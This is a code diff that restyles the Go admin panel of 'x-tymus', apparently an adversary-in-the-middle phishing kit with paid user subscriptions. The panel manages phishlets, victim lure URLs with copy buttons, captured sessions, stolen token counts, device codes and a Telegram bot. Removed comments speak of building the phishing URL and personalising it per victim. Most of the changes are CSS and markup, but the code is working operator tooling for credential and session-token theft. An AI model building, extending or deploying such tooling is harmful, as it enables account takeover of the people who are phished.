@@ -18,91 +18,151 @@ import (
 // ───────────────────────────── CSS / shell ─────────────────────────────────
 
 const panelCSS = `
+:root{
+  --bg:#07070f;--surf:#0d0d1a;--card:#111120;--brd:#1c1c2e;--brd2:#111120;
+  --t1:#e2e2f0;--t2:#7070a0;--t3:#32324a;
+  --brand:#7c3aed;--blue:#3b82f6;--green:#10b981;--red:#ef4444;--amber:#f59e0b;--cyan:#06b6d4;
+  --r:8px;--r2:5px;
+}
 *{box-sizing:border-box;margin:0;padding:0}
-body{background:#0d0d0d;color:#e0e0e0;font-family:'Segoe UI',monospace;font-size:14px}
-h1{color:#e05252;font-size:1.4rem;margin-bottom:4px}
-h2{color:#e0a040;font-size:1.1rem;margin:24px 0 8px;border-bottom:1px solid #222;padding-bottom:6px}
-a{color:#52b0e0;text-decoration:none}a:hover{text-decoration:underline}
-.wrap{max-width:1300px;margin:0 auto;padding:24px 16px}
-.topbar{background:#111;border-bottom:1px solid #2a2a2a;padding:12px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100;flex-wrap:wrap}
-.topbar .brand{color:#e05252;font-size:1.1rem;font-weight:bold;letter-spacing:2px}
-.topbar .sub{color:#555;font-size:.82rem}
-.topbar nav{margin-left:auto;display:flex;gap:12px;flex-wrap:wrap}
-.topbar nav a{color:#888;font-size:.82rem}
-.topbar nav a:hover{color:#e0e0e0}
-.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:.75rem;font-weight:600}
-.badge-green{background:#0d2a0d;color:#4cd44c}
-.badge-red{background:#2a0d0d;color:#e05252}
-.badge-blue{background:#0d1a2a;color:#52b0e0}
-.badge-yellow{background:#2a1e00;color:#e0a040}
-.badge-gray{background:#1e1e1e;color:#777}
-.stats{display:flex;gap:12px;margin:16px 0;flex-wrap:wrap}
-.stat-box{background:#141414;border:1px solid #252525;border-radius:6px;padding:14px 22px;min-width:130px}
-.stat-box .n{font-size:2rem;font-weight:700;color:#e05252}
-.stat-box .n.green{color:#4cd44c}
-.stat-box .n.blue{color:#52b0e0}
-.stat-box .l{font-size:.75rem;color:#555;margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
-.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;width:100%}
-table{width:100%;border-collapse:collapse;margin-top:6px;font-size:.84rem;min-width:500px}
-th{background:#161616;color:#666;font-size:.72rem;text-transform:uppercase;letter-spacing:.5px;padding:8px 10px;text-align:left;border-bottom:1px solid #252525}
-td{padding:7px 10px;border-bottom:1px solid #181818;vertical-align:middle}
-tr:hover td{background:#121212}
-.mono{font-family:monospace;font-size:.82rem;color:#aaa}
-.url-cell{font-family:monospace;font-size:.78rem;color:#52b0e0;word-break:break-all;max-width:260px}
+body{background:var(--bg);color:var(--t1);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Inter',sans-serif;font-size:13px;line-height:1.55}
+a{color:var(--blue);text-decoration:none}
+a:hover{text-decoration:underline;opacity:.85}
+
+/* ── Topbar ── */
+.topbar{background:var(--surf);border-bottom:1px solid var(--brd);padding:0 24px;height:54px;display:flex;align-items:center;gap:18px;position:sticky;top:0;z-index:200}
+.brand{display:flex;align-items:center;gap:9px;font-size:14px;font-weight:700;color:#fff;letter-spacing:-.3px;flex-shrink:0}
+.brand-icon{width:26px;height:26px;background:linear-gradient(135deg,var(--brand) 0%,#4f46e5 100%);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:13px;color:#fff;flex-shrink:0;box-shadow:0 2px 8px rgba(124,58,237,.4)}
+.topbar-status{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--t2)}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.topbar-nav{margin-left:auto;display:flex;align-items:center;gap:14px}
+.topbar-nav a{color:var(--t2);font-size:12px;font-weight:500;transition:color .15s}
+.topbar-nav a:hover{color:var(--t1);text-decoration:none}
+
+/* ── Tab bar ── */
+.tabbar{background:var(--surf);border-bottom:1px solid var(--brd);display:flex;padding:0 20px;overflow-x:auto;-webkit-overflow-scrolling:touch;gap:0}
+.tabbar::-webkit-scrollbar{height:0}
+.tab{padding:13px 15px;font-size:12px;font-weight:500;color:var(--t2);border-bottom:2px solid transparent;white-space:nowrap;cursor:pointer;text-decoration:none;transition:color .15s,border-color .15s;display:flex;align-items:center;gap:6px}
+.tab:hover{color:var(--t1);text-decoration:none}
+.tab.active{color:#fff;border-bottom-color:var(--brand)}
+.tab-pill{background:var(--amber);color:#000;border-radius:10px;padding:1px 6px;font-size:10px;font-weight:800;line-height:1.4}
+
+/* ── Layout ── */
+.wrap{max-width:1400px;margin:0 auto;padding:26px 22px}
+
+/* ── Stats ── */
+.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(138px,1fr));gap:10px;margin-bottom:26px}
+.stat{background:var(--card);border:1px solid var(--brd);border-radius:var(--r);padding:16px 18px;position:relative;overflow:hidden;transition:border-color .2s}
+.stat:hover{border-color:var(--t3)}
+.stat::after{content:'';position:absolute;top:0;right:0;width:40%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.015));pointer-events:none}
+.stat-n{font-size:28px;font-weight:700;line-height:1;margin-bottom:5px;font-variant-numeric:tabular-nums}
+.stat-l{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3)}
+
+/* ── Section ── */
+.section{margin-bottom:28px}
+.section-hd{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.section-title{font-size:11.5px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t2);white-space:nowrap}
+.section-line{flex:1;height:1px;background:var(--brd)}
+
+/* ── Card ── */
+.card{background:var(--card);border:1px solid var(--brd);border-radius:var(--r);padding:18px 20px}
+
+/* ── Tables ── */
+.table-wrap{border:1px solid var(--brd);border-radius:var(--r);overflow:hidden;overflow-x:auto;-webkit-overflow-scrolling:touch}
+.table-wrap table{border:none!important;min-width:500px}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+thead tr{background:rgba(13,13,26,.9)}
+th{padding:10px 14px;text-align:left;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);border-bottom:1px solid var(--brd);white-space:nowrap}
+td{padding:11px 14px;border-bottom:1px solid var(--brd2);vertical-align:middle}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover td{background:rgba(255,255,255,.018)}
+
+/* ── Badges ── */
+.badge{display:inline-flex;align-items:center;padding:3px 9px;border-radius:20px;font-size:10.5px;font-weight:700;white-space:nowrap}
+.badge-green{background:rgba(16,185,129,.12);color:#34d399}
+.badge-red{background:rgba(239,68,68,.12);color:#f87171}
+.badge-blue{background:rgba(59,130,246,.12);color:#60a5fa}
+.badge-yellow,.badge-amber{background:rgba(245,158,11,.12);color:#fbbf24}
+.badge-gray{background:rgba(255,255,255,.06);color:#6b7280}
+.badge-purple{background:rgba(124,58,237,.14);color:#a78bfa}
+
+/* ── Forms ── */
+.form-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:14px;margin-bottom:16px}
+.form-row{display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end;margin-bottom:10px}
+.field{display:flex;flex-direction:column;gap:5px}
+.field-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3)}
+.field-full{grid-column:1/-1}
+input[type=text],input[type=password],select,textarea{
+  background:var(--surf);border:1px solid var(--brd);color:var(--t1);
+  padding:8px 11px;border-radius:var(--r2);font-size:12.5px;outline:none;
+  transition:border-color .15s,box-shadow .15s;font-family:inherit;width:100%
+}
+input:focus,select:focus,textarea:focus{border-color:var(--brand);box-shadow:0 0 0 3px rgba(124,58,237,.12)}
+textarea{resize:vertical;line-height:1.6}
+
+/* ── Buttons ── */
+.btn,button{
+  display:inline-flex;align-items:center;gap:5px;
+  padding:7px 15px;border-radius:var(--r2);
+  font-size:12px;font-weight:600;cursor:pointer;
+  border:1px solid transparent;text-decoration:none;
+  white-space:nowrap;transition:opacity .15s,transform .1s;
+  font-family:inherit;line-height:1;
+}
+.btn:hover,button:hover{opacity:.82;text-decoration:none}
+.btn:active,button:active{transform:scale(.97)}
+.btn-primary{background:var(--brand);color:#fff;border-color:var(--brand)}
+.btn-blue{background:var(--blue);color:#fff;border-color:var(--blue)}
+.btn-green{background:var(--green);color:#fff;border-color:var(--green)}
+.btn-danger{background:var(--red);color:#fff;border-color:var(--red)}
+.btn-ghost{background:transparent;color:var(--t2);border-color:var(--brd)}
+.btn-ghost:hover{color:var(--t1);border-color:var(--t3)}
+.btn-amber{background:rgba(245,158,11,.15);color:var(--amber);border-color:rgba(245,158,11,.25)}
+.btn-sm{padding:5px 12px;font-size:11px}
+.btn-xs{padding:3px 9px;font-size:10.5px}
+
+/* ── Alerts ── */
+.flash-err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.22);color:#fca5a5;border-radius:var(--r2);padding:10px 14px;margin-bottom:16px;font-size:12.5px}
+.flash-ok{background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.22);color:#6ee7b7;border-radius:var(--r2);padding:10px 14px;margin-bottom:16px;font-size:12.5px}
+
+/* ── Misc ── */
+.mono{font-family:'SF Mono','Fira Code',monospace;font-size:11.5px}
+pre{background:var(--surf);border:1px solid var(--brd);border-radius:var(--r2);padding:11px 13px;font-size:11px;overflow-x:auto;color:#9ca3af;white-space:pre-wrap;word-break:break-all}
+.empty{color:var(--t3);padding:30px 0;text-align:center;font-size:12.5px;font-style:italic}
 form.inline{display:inline}
-input[type=text],input[type=password],select,textarea{background:#171717;border:1px solid #2e2e2e;color:#e0e0e0;padding:6px 10px;border-radius:4px;font-size:.84rem}
-input[type=text]:focus,input[type=password]:focus,select:focus,textarea:focus{outline:none;border-color:#484848}
-button,.btn{background:#1e1212;border:1px solid #4a2020;color:#e05252;padding:5px 14px;border-radius:4px;cursor:pointer;font-size:.8rem;text-decoration:none;display:inline-block}
-button:hover,.btn:hover{background:#2a1818;border-color:#7a3333}
-.btn-blue{background:#101820;border-color:#1e4466;color:#52b0e0}
-.btn-blue:hover{background:#152030;border-color:#2a5588}
-.btn-green{background:#0d1e0d;border-color:#1e4a1e;color:#4cd44c}
-.btn-green:hover{background:#102510;border-color:#2a6a2a}
-.btn-gray{background:#181818;border-color:#2e2e2e;color:#777}
-.section{margin-top:32px}
-.form-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px}
-.card{background:#111;border:1px solid #222;border-radius:6px;padding:16px;margin:10px 0}
-.err{color:#e05252;background:#1a0808;border:1px solid #3a1212;border-radius:4px;padding:8px 12px;margin:10px 0;font-size:.84rem}
-.ok{color:#4cd44c;background:#081a08;border:1px solid #123a12;border-radius:4px;padding:8px 12px;margin:10px 0;font-size:.84rem}
-.empty{color:#383838;font-style:italic;padding:14px 0;font-size:.84rem}
-.chain-box{background:#0a0e0a;border:1px solid #1a2e1a;border-radius:5px;padding:12px 14px;margin-top:8px;font-size:.78rem}
-.chain-box .label{color:#4cd44c;font-weight:600;margin-bottom:4px;font-size:.72rem;text-transform:uppercase;letter-spacing:.5px}
-.chain-box .link{font-family:monospace;color:#52e08a;word-break:break-all;margin-bottom:8px}
-.chain-box .link a{color:#52e08a}
-.chain-box .hop{font-family:monospace;color:#555;font-size:.72rem;margin-top:2px;word-break:break-all}
-details>summary{cursor:pointer;color:#52b0e0;font-size:.8rem;padding:4px 0;list-style:none}
+details>summary{cursor:pointer;color:var(--blue);font-size:11.5px;list-style:none;display:inline-flex;align-items:center;gap:4px;user-select:none}
 details>summary::-webkit-details-marker{display:none}
-details[open]>summary{color:#e0a040}
-pre{background:#0a0a0a;border:1px solid #1e1e1e;padding:10px;border-radius:4px;overflow-x:auto;font-size:.75rem;color:#aaa;white-space:pre-wrap;word-break:break-all}
-.tabs{display:flex;gap:0;border-bottom:1px solid #252525;margin-bottom:16px;overflow-x:auto;-webkit-overflow-scrolling:touch}
-.tab{padding:8px 18px;cursor:pointer;font-size:.82rem;color:#666;border-bottom:2px solid transparent;white-space:nowrap}
-.tab.active{color:#e0a040;border-bottom-color:#e0a040}
+details[open]>summary{color:var(--amber)}
+.chain-box{background:rgba(16,185,129,.03);border:1px solid rgba(16,185,129,.1);border-radius:var(--r2);padding:12px;margin-top:8px}
+.chain-label{color:var(--green);font-weight:700;font-size:10px;text-transform:uppercase;letter-spacing:.5px;margin:8px 0 3px}
+.chain-label:first-child{margin-top:0}
+.chain-link{font-family:monospace;color:#34d399;font-size:11.5px;word-break:break-all}
+.chain-hop{font-family:monospace;color:var(--t3);font-size:10.5px;word-break:break-all;margin-top:2px}
+.url-cell{font-family:monospace;font-size:11.5px;color:var(--blue);word-break:break-all;max-width:270px}
+.kv-row{display:flex;gap:8px;align-items:center;margin-bottom:6px;font-size:12px}
+.kv-key{color:var(--t3);font-weight:600;text-transform:uppercase;font-size:10px;letter-spacing:.4px;min-width:90px}
+.kv-val{color:var(--t1)}
+
+/* ── Responsive ── */
 @media(max-width:768px){
-  .wrap{padding:12px 8px}
-  .topbar{padding:10px 14px;gap:8px}
-  .topbar .sub{display:none}
-  .topbar nav{margin-left:0;width:100%;gap:8px;font-size:.78rem}
-  .topbar nav a{font-size:.78rem}
-  h1{font-size:1.2rem}
-  h2{font-size:1rem}
-  .stat-box{min-width:calc(50% - 6px);flex:1 1 calc(50% - 6px)}
-  .form-row{flex-direction:column;align-items:stretch}
-  .form-row label{width:auto!important}
-  .form-row input[type=text],.form-row input[type=password],.form-row select,.form-row textarea{width:100%!important;max-width:100%!important}
-  input[type=text],input[type=password],select{width:100%!important;max-width:100%!important}
-  textarea{width:100%!important;max-width:100%!important}
-  .card{padding:10px}
-  table{min-width:420px;font-size:.78rem}
-  th,td{padding:6px 6px}
-  .url-cell{max-width:120px}
-  .chain-box{padding:8px 10px}
-  .section{margin-top:20px}
-  .tabs{flex-wrap:nowrap}
+  .topbar{padding:0 14px;height:48px;gap:10px}
+  .topbar-status{display:none}
+  .tabbar{padding:0 10px}
+  .wrap{padding:14px 10px}
+  .stats{grid-template-columns:repeat(2,1fr);gap:8px}
+  .stat{padding:12px 13px}
+  .stat-n{font-size:22px}
+  .card{padding:13px 14px}
+  .form-grid{grid-template-columns:1fr!important}
+  th,td{padding:8px 10px}
+  .tab{padding:10px 11px;font-size:11px}
+  .section-title{font-size:10.5px}
 }
 @media(max-width:480px){
-  .stat-box{min-width:calc(50% - 6px);flex:1 1 calc(50% - 6px);padding:10px 12px}
-  .stat-box .n{font-size:1.5rem}
-  button,.btn{padding:6px 10px;font-size:.78rem}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .stat-n{font-size:18px}
+  .topbar-nav{display:none}
 }
 `
 
@@ -117,19 +177,24 @@ func panelPage(title, navExtra, body string) string {
 </head>
 <body>
 <div class="topbar">
-  <span class="brand">◈ x-tymus</span>
-  <span class="sub">%s</span>
-  <nav>%s</nav>
+  <div class="brand">
+    <div class="brand-icon">⚡</div>
+    x-tymus
+  </div>
+  <div class="topbar-status">
+    <span class="dot"></span>
+    <span>online</span>
+  </div>
+  <nav class="topbar-nav">%s</nav>
 </div>
 <div class="wrap">%s</div>
 <script>
-// copy-to-clipboard helper (works on mobile too)
 function cp(el){
   var t=el.getAttribute('data-copy');
   var done=function(){var old=el.textContent;el.textContent='copied!';setTimeout(function(){el.textContent=old},1400);};
   if(navigator.clipboard&&navigator.clipboard.writeText){
     navigator.clipboard.writeText(t).then(done,function(){fallbackCopy(t,done);});
-  } else { fallbackCopy(t,done); }
+  }else{fallbackCopy(t,done);}
 }
 function fallbackCopy(t,cb){
   var ta=document.createElement('textarea');
@@ -139,7 +204,7 @@ function fallbackCopy(t,cb){
   document.body.removeChild(ta);
 }
 </script>
-</body></html>`, title, panelCSS, title, navExtra, body)
+</body></html>`, title, panelCSS, navExtra, body)
 }
 
 // ───────────────────────────── Auth ────────────────────────────────────────
@@ -166,7 +231,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// ── POST actions ──
 	if r.Method == http.MethodPost {
 		r.ParseForm()
 		switch r.FormValue("action") {
@@ -231,7 +295,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			http.Redirect(w, r, "/admin/panel?tab=sessions", http.StatusSeeOther)
 			return
 
-		// ── Lure management ──
 		case "create_lure":
 			pl := strings.TrimSpace(r.FormValue("phishlet"))
 			path := strings.TrimSpace(r.FormValue("path"))
@@ -270,7 +333,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			http.Redirect(w, r, "/admin/panel?tab=lures&ok=lure+updated", http.StatusSeeOther)
 			return
 
-		// ── Phishlet management ──
 		case "enable_phishlet":
 			site := strings.TrimSpace(r.FormValue("site"))
 			if err := s.Cfg.SetSiteEnabled(site); err != nil {
@@ -309,7 +371,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			}
 			return
 
-		// ── Telegram Bot config ──
 		case "save_bot_config":
 			token := strings.TrimSpace(r.FormValue("bot_token"))
 			adminIdStr := strings.TrimSpace(r.FormValue("bot_admin_chat_id"))
@@ -421,41 +482,40 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 
 	var b strings.Builder
 
-	// ── Header & stats ──
-	b.WriteString(`<h1>Admin Panel</h1>`)
+	// ── Stats ──
 	b.WriteString(fmt.Sprintf(`<div class="stats">
-  <div class="stat-box"><div class="n">%d</div><div class="l">Users</div></div>
-  <div class="stat-box"><div class="n blue">%d</div><div class="l">Lures</div></div>
-  <div class="stat-box"><div class="n">%d</div><div class="l">Sessions</div></div>
-  <div class="stat-box"><div class="n green">%d</div><div class="l">With Tokens</div></div>
-  <div class="stat-box"><div class="n" style="color:#e0a040">%d</div><div class="l">Subscriptions</div></div>
-  <div class="stat-box"><div class="n" style="color:#e05252">%d</div><div class="l">Pending Subs</div></div>
-  <div class="stat-box"><div class="n" style="color:#555">%d</div><div class="l">Blacklisted</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--blue)">%d</div><div class="stat-l">Users</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--cyan)">%d</div><div class="stat-l">Lures</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--t1)">%d</div><div class="stat-l">Sessions</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--green)">%d</div><div class="stat-l">With Tokens</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--amber)">%d</div><div class="stat-l">Subscriptions</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--red)">%d</div><div class="stat-l">Pending Subs</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--t3)">%d</div><div class="stat-l">Blacklisted</div></div>
 </div>`, len(userList), len(allLures), len(allSessions), totalTokens, len(allSubs), pendingSubs, blCount))
 
 	if errMsg != "" {
-		b.WriteString(fmt.Sprintf(`<div class="err">%s</div>`, template.HTMLEscapeString(errMsg)))
+		b.WriteString(fmt.Sprintf(`<div class="flash-err">%s</div>`, template.HTMLEscapeString(errMsg)))
 	}
 	if okMsg != "" {
-		b.WriteString(fmt.Sprintf(`<div class="ok">%s</div>`, template.HTMLEscapeString(okMsg)))
+		b.WriteString(fmt.Sprintf(`<div class="flash-ok">%s</div>`, template.HTMLEscapeString(okMsg)))
 	}
 
-	// ── Tab nav ──
+	// ── Tabs ──
 	pendingLabel := "Telegram Bot"
 	if pendingSubs > 0 {
-		pendingLabel = fmt.Sprintf("Telegram Bot (%d pending)", pendingSubs)
+		pendingLabel = fmt.Sprintf(`Telegram Bot <span class="tab-pill">%d</span>`, pendingSubs)
 	}
 	tabs := []struct{ id, label string }{
 		{"overview", "Overview"},
 		{"users", "Users"},
 		{"phishlets", "Phishlets"},
-		{"lures", "Lures & Chains"},
+		{"lures", "Lures &amp; Chains"},
 		{"sessions", "Sessions"},
 		{"devicecodes", "Device Codes"},
 		{"blacklist", "Blacklist"},
 		{"telegram", pendingLabel},
 	}
-	b.WriteString(`<div class="tabs">`)
+	b.WriteString(`<div class="tabbar">`)
 	for _, t := range tabs {
 		cls := "tab"
 		if t.id == activeTab {
@@ -463,47 +523,53 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		}
 		b.WriteString(fmt.Sprintf(`<a href="/admin/panel?tab=%s" class="%s">%s</a>`, t.id, cls, t.label))
 	}
-	b.WriteString(`</div>`)
+	b.WriteString(`</div><div style="height:20px"></div>`)
 
+	// ── Tab content ──
 	switch activeTab {
 
-	// ── OVERVIEW ──────────────────────────────────────────────────────────
+	// ── OVERVIEW ─────────────────────────────────────────────────────────────
 	case "overview":
-		b.WriteString(`<div class="section"><h2>Recent Sessions</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Recent Sessions"))
 		recent := allSessions
 		if len(recent) > 10 {
 			recent = recent[len(recent)-10:]
 		}
 		if len(recent) == 0 {
-			b.WriteString(`<div class="empty">No sessions yet.</div>`)
+			b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
 		} else {
 			b.WriteString(sessionTable(recent, false))
 		}
 		b.WriteString(`</div>`)
 
-		b.WriteString(`<div class="section"><h2>Users at a Glance</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Users"))
 		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
 		b.WriteString(`</div>`)
 
-	// ── USERS ─────────────────────────────────────────────────────────────
+	// ── USERS ─────────────────────────────────────────────────────────────────
 	case "users":
-		b.WriteString(`<div class="section"><h2>Create User</h2>`)
-		b.WriteString(`<form method="POST" action="/admin/panel">
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Create User"))
+		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel">
 <input type="hidden" name="action" value="create_user">
-<div class="form-row">
-  <input type="text" name="username" placeholder="username" required style="width:160px">
-  <input type="password" name="password" placeholder="password" required style="width:160px">
-  <button type="submit" class="btn-blue">+ Create User</button>
-</div></form>`)
-		b.WriteString(`</div>`)
+<div class="form-grid" style="grid-template-columns:repeat(auto-fill,minmax(180px,1fr))">
+  <div class="field"><label class="field-label">Username</label><input type="text" name="username" placeholder="username" required></div>
+  <div class="field"><label class="field-label">Password</label><input type="password" name="password" placeholder="password" required></div>
+  <div class="field" style="justify-content:flex-end"><button type="submit" class="btn btn-blue">+ Create User</button></div>
+</div>
+</form></div></div>`)
 
-		b.WriteString(`<div class="section"><h2>All Users</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("All Users"))
 		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
 		b.WriteString(`</div>`)
 
-	// ── PHISHLETS ─────────────────────────────────────────────────────────
+	// ── PHISHLETS ─────────────────────────────────────────────────────────────
 	case "phishlets":
-		b.WriteString(`<div class="section"><h2>Phishlet Configuration</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Phishlet Configuration"))
 		names := s.Cfg.GetPhishletNames()
 		if len(names) == 0 {
 			b.WriteString(`<div class="empty">No phishlets loaded. Add .yaml files to your phishlets directory.</div>`)
@@ -516,15 +582,15 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 				enabled := pc.Enabled
 				statusBadge := `<span class="badge badge-gray">disabled</span>`
 				if enabled {
-					statusBadge = `<span class="badge badge-green">enabled</span>`
+					statusBadge = `<span class="badge badge-green">● enabled</span>`
 				}
 				hostname := pc.Hostname
 				if hostname == "" {
-					hostname = `<span style="color:#555">not set</span>`
+					hostname = `<span style="color:var(--t3)">not set</span>`
 				}
 				unauthUrl := pc.UnauthUrl
 				if unauthUrl == "" {
-					unauthUrl = `<span style="color:#555">—</span>`
+					unauthUrl = `<span style="color:var(--t3)">—</span>`
 				}
 
 				toggleBtn := ""
@@ -532,33 +598,33 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
 <input type="hidden" name="action" value="disable_phishlet">
 <input type="hidden" name="site" value="%s">
-<button type="submit" class="btn-gray" style="font-size:.74rem;padding:2px 8px">disable</button>
+<button type="submit" class="btn btn-ghost btn-xs">Disable</button>
 </form>`, template.HTMLEscapeString(name))
 				} else {
 					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
 <input type="hidden" name="action" value="enable_phishlet">
 <input type="hidden" name="site" value="%s">
-<button type="submit" class="btn-green" style="font-size:.74rem;padding:2px 8px">enable</button>
+<button type="submit" class="btn btn-green btn-xs">Enable</button>
 </form>`, template.HTMLEscapeString(name))
 				}
 
-				hostnameForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:4px;margin-top:4px">
+				hostnameForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:5px;margin-top:5px">
 <input type="hidden" name="action" value="set_phishlet_hostname">
 <input type="hidden" name="site" value="%s">
-<input type="text" name="hostname" placeholder="sub.yourdomain.com" style="font-size:.76rem;padding:3px 6px;width:200px" value="%s">
-<button type="submit" style="font-size:.74rem;padding:3px 8px">set</button>
+<input type="text" name="hostname" placeholder="sub.domain.com" style="font-size:11.5px;padding:5px 8px" value="%s">
+<button type="submit" class="btn btn-ghost btn-xs">Set</button>
 </form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.Hostname))
 
-				unauthForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:4px;margin-top:4px">
+				unauthForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:5px;margin-top:5px">
 <input type="hidden" name="action" value="set_phishlet_unauth">
 <input type="hidden" name="site" value="%s">
-<input type="text" name="unauth_url" placeholder="https://..." style="font-size:.76rem;padding:3px 6px;width:200px" value="%s">
-<button type="submit" style="font-size:.74rem;padding:3px 8px">set</button>
+<input type="text" name="unauth_url" placeholder="https://..." style="font-size:11.5px;padding:5px 8px" value="%s">
+<button type="submit" class="btn btn-ghost btn-xs">Set</button>
 </form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.UnauthUrl))
 
 				b.WriteString(fmt.Sprintf(`<tr>
-<td><span class="badge badge-red">%s</span></td>
-<td style="color:#aaa;font-size:.82rem">%s</td>
+<td><span class="badge badge-purple">%s</span></td>
+<td style="color:var(--t2);font-size:12px">%s</td>
 <td>%s%s</td>
 <td>%s%s</td>
 <td>%s</td>
@@ -576,18 +642,20 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		}
 		b.WriteString(`</div>`)
 
-		// Quick create lure from this tab too
-		b.WriteString(`<div class="section"><h2>Quick Create Lure</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Quick Create Lure"))
 		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
 		b.WriteString(`</div>`)
 
-	// ── LURES & CHAINS ────────────────────────────────────────────────────
+	// ── LURES ─────────────────────────────────────────────────────────────────
 	case "lures":
-		b.WriteString(`<div class="section"><h2>Create Lure</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Create Lure"))
 		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
 		b.WriteString(`</div>`)
 
-		b.WriteString(`<div class="section"><h2>All Lures</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("All Lures"))
 		if len(allLures) == 0 {
 			b.WriteString(`<div class="empty">No lures configured yet. Create one above.</div>`)
 		} else {
@@ -595,7 +663,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 <th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Assigned User</th><th>Redirect Chain</th><th>Actions</th>
 </tr></thead><tbody>`)
 			for i, l := range allLures {
-				// Build the phishing URL for this lure
 				lureURL := ""
 				if l.Hostname != "" {
 					lureURL = "https://" + l.Hostname + l.Path
@@ -604,29 +671,26 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 						lureURL = pu
 					}
 				}
-				// lureURL is the clean base URL — no login_hint placeholder here.
-				// To personalize for a specific victim add ?login_hint=email manually.
 
-				lureURLCell := `<span style="color:#383838">—</span>`
+				lureURLCell := `<span style="color:var(--t3)">—</span>`
 				if lureURL != "" {
-					lureURLCell = fmt.Sprintf(`<span class="url-cell">%s</span>
-<button class="btn-gray" style="font-size:.7rem;padding:2px 7px;margin-top:3px" onclick="cp(this)" data-copy="%s">copy</button>`,
+					lureURLCell = fmt.Sprintf(`<div class="url-cell">%s</div>
+<button class="btn btn-ghost btn-xs" style="margin-top:4px" onclick="cp(this)" data-copy="%s">Copy URL</button>`,
 						template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
 				}
 
-				redirectCell := `<span style="color:#383838">—</span>`
+				redirectCell := `<span style="color:var(--t3)">—</span>`
 				if l.RedirectUrl != "" {
-					redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:.76rem">%s</a>`,
+					redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:11px;color:var(--t2)">%s</a>`,
 						template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 36)))
 				}
 
-				userCell := `<span style="color:#383838">unassigned</span>`
